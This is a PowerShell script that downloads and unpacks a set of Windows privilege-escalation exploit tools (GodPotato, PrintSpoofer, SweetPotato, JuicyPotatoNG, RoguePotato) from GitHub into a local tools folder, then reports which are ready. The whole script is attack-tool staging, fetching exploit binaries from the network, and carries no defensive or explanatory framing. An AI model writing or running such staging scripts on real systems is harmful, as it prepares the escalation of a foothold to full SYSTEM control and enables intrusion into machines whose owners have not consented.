[CmdletBinding()]
param()
Set-StrictMode -Version 2
$ErrorActionPreference = "Stop"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$dir = "C:\Tools\ADTools"
if (-not (Test-Path -LiteralPath $dir)) {
    New-Item -ItemType Directory -Force -Path $dir | Out-Null
}
$tools = @{
    "GodPotato-NET4.exe" = "https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe"
    "PrintSpoofer64.exe" = "https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe"
    "SweetPotato.exe"    = "https://raw.githubusercontent.com/uknowsec/SweetPotato/master/SweetPotato-Webshell-new/bin/Release/SweetPotato.exe"
    "JuicyPotatoNG.zip"  = "https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.1/JuicyPotatoNG.zip"
    "RoguePotato.zip"    = "https://github.com/antonioCoco/RoguePotato/releases/download/1.0/RoguePotato.zip"
}
function Ensure-Tool {
    param([string]$Name, [string]$Url)
    $path = Join-Path $dir $Name
    if (Test-Path -LiteralPath $path) {
        Write-Output ("OK:" + $Name)
        return
    }
    $tmp = "$path.tmp"
    Invoke-WebRequest -Uri $Url -OutFile $tmp -UseBasicParsing
    Move-Item $tmp $path -Force
    if ($Name -like "*.zip") {
        Expand-Archive -Force $path $dir
        Write-Output ("EXTRACTED:" + $Name)
    } else {
        Write-Output ("DOWNLOADED:" + $Name)
    }
}
foreach ($t in $tools.GetEnumerator()) {
    Ensure-Tool -Name $t.Key -Url $t.Value
}
if (-not (Test-Path (Join-Path $dir "JuicyPotatoNG.exe"))) {
    Get-ChildItem $dir -Filter "JuicyPotatoNG*.exe" | Select-Object -First 1 | ForEach-Object {
        Copy-Item $_.FullName (Join-Path $dir "JuicyPotatoNG.exe") -Force
        Write-Output "RENAME:JuicyPotatoNG.exe"
    }
}
if (-not (Test-Path (Join-Path $dir "RoguePotato.exe"))) {
    Get-ChildItem $dir -Filter "RoguePotato.exe" -Recurse | Select-Object -First 1 | ForEach-Object {
        Copy-Item $_.FullName (Join-Path $dir "RoguePotato.exe") -Force
        Write-Output "RENAME:RoguePotato.exe"
    }
}
foreach ($n in @("GodPotato-NET4.exe", "PrintSpoofer64.exe", "SweetPotato.exe", "JuicyPotatoNG.exe", "RoguePotato.exe")) {
    if (Test-Path (Join-Path $dir $n)) {
        Write-Output ("READY:" + $n)
    } else {
        Write-Output ("MISSING:" + $n)
    }
}
